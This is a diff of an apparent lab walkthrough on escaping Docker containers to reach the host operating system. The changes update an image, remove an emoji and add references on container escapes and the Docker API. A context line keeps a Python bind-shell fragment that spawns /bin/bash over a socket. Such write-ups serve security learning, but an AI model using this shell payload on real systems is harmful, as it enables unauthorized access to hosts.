@@ -4,7 +4,8 @@
 * B. Compromising Container C2
 * C. Comprimising Underlying Operating System **\[Goal\]**
 
-![Attack1](https://user-images.githubusercontent.com/30471250/155872286-d5da04ff-967e-4f6a-a483-ff83a2097235.jpg)
+![Attack1_IPs](https://user-images.githubusercontent.com/30471250/155939425-46f20bd4-b65b-4679-9154-0328453668cc.jpg)
+
 ---
 
 #### A. Compromising Container C1:
@@ -233,12 +234,14 @@ You could see the status is open. Now is the time to connect to the bind shell w
 
 	`import pty,os;os.dup2(r.fileno(),0);os.dup2(r.fileno(),1);os.dup2(r.fileno(),2);pty.spawn("/bin/bash");s.close()`
 
-and BOOM💥! You got access to the operating system.
+and BOOM! You got access to the operating system.
 
 ---
 
 References:
 
-1. https://blog.atucom.net/2017/06/smallest-python-bind-shell.html
-2. 
-
+1. https://blog.atucom.net/2017/06/smallest-python-bind-shell.html	[Smallest Python Bind Shell]
+2. https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/	[SYS_ADMIN Exploit Breakdown]
+3. https://docs.docker.com/engine/api/sdk/examples/	[Communicating with docker.sock using unix sockets]
+4. https://docs.docker.com/engine/api/v1.41/#tag/Exec	[Creating and starting an exec instance on already running container using HTTP]
+5. https://tryhackme.com/room/dockerrodeo	[Docker Registry, Reverse Engineering docker images]
